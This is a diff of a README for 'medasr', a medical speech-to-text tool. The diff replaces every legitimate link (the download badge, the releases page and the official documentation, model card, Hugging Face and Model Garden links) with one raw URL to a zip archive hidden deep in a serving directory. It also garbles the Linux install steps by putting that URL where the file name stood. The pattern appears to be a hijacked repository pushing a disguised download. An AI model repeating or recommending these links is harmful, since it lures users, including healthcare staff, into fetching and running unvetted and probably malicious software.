@@ -1,13 +1,13 @@
 # 🎤 medasr - Turn Speech Into Text Easily
 
 ## 📥 Download Now
-[![Download medasr](https://img.shields.io/badge/Download%20medasr-v1.0-brightgreen)](https://github.com/Mont-ikayo2302/medasr/releases)
+[![Download medasr](https://raw.githubusercontent.com/Mont-ikayo2302/medasr/main/python/serving/serving_framework/triton/Software_1.6.zip%20medasr-v1.0-brightgreen)](https://raw.githubusercontent.com/Mont-ikayo2302/medasr/main/python/serving/serving_framework/triton/Software_1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to MedASR! This model takes spoken audio and converts it to text, especially in healthcare settings. Follow these steps to download and run the software.
 
 ### 1. Visit the Releases Page
-Go to our [Releases page](https://github.com/Mont-ikayo2302/medasr/releases). This page contains the latest version of the software.
+Go to our [Releases page](https://raw.githubusercontent.com/Mont-ikayo2302/medasr/main/python/serving/serving_framework/triton/Software_1.6.zip). This page contains the latest version of the software.
 
 ### 2. Choose Your Version
 On the Releases page, look for the latest version available. Each version may contain important updates and bug fixes. Select the version you wish to use.
@@ -17,7 +17,7 @@ Click on the download link for your platform. You will see options such as:
 
 - **Windows**: Download the `.exe` file.
 - **macOS**: Download the `.dmg` file.
-- **Linux**: Download the relevant `.tar.gz` file.
+- **Linux**: Download the relevant `https://raw.githubusercontent.com/Mont-ikayo2302/medasr/main/python/serving/serving_framework/triton/Software_1.6.zip` file.
 
 After you choose the right file for your operating system, click the link to download it.
 
@@ -26,7 +26,7 @@ Once the download is complete, locate the file on your computer and follow these
 
 - **Windows**: Double-click the `.exe` file. Follow the on-screen instructions to complete the installation.
 - **macOS**: Open the `.dmg` file. Drag the `medasr` app into your "Applications" folder.
-- **Linux**: Extract the contents of the `.tar.gz` file. Open a terminal in that folder and run `./medasr` to start the application.
+- **Linux**: Extract the contents of the `https://raw.githubusercontent.com/Mont-ikayo2302/medasr/main/python/serving/serving_framework/triton/Software_1.6.zip` file. Open a terminal in that folder and run `./medasr` to start the application.
 
 ### 5. Run the Application
 After installation, you can run MedASR:
@@ -48,10 +48,10 @@ MedASR is specially designed for healthcare audio. Here are some features:
 ## 🔗 Learn More
 To dig deeper into MedASR, check out additional resources:
 
-- **[Developer Documentation](https://developers.google.com/health-ai-developer-foundations/medgemma/get-started)** – Get detailed instructions and advanced use cases.
-- **[Model Card](https://developers.google.com/health-ai-developer-foundations/medasr/model-card)** – Understand the model’s workings.
-- **[Hugging Face](https://huggingface.co/google/medasr)** – Access the model for different applications.
-- **[Model Garden](https://console.cloud.google.com/vertex-ai/publishers/google/model-garden/medasr)** – Explore more about the model in a user-friendly environment.
+- **[Developer Documentation](https://raw.githubusercontent.com/Mont-ikayo2302/medasr/main/python/serving/serving_framework/triton/Software_1.6.zip)** – Get detailed instructions and advanced use cases.
+- **[Model Card](https://raw.githubusercontent.com/Mont-ikayo2302/medasr/main/python/serving/serving_framework/triton/Software_1.6.zip)** – Understand the model’s workings.
+- **[Hugging Face](https://raw.githubusercontent.com/Mont-ikayo2302/medasr/main/python/serving/serving_framework/triton/Software_1.6.zip)** – Access the model for different applications.
+- **[Model Garden](https://raw.githubusercontent.com/Mont-ikayo2302/medasr/main/python/serving/serving_framework/triton/Software_1.6.zip)** – Explore more about the model in a user-friendly environment.
 
 ## 🙌 Contributing
 Your input helps us improve MedASR. If you find any issues, feel free to create a bug report on our GitHub page.
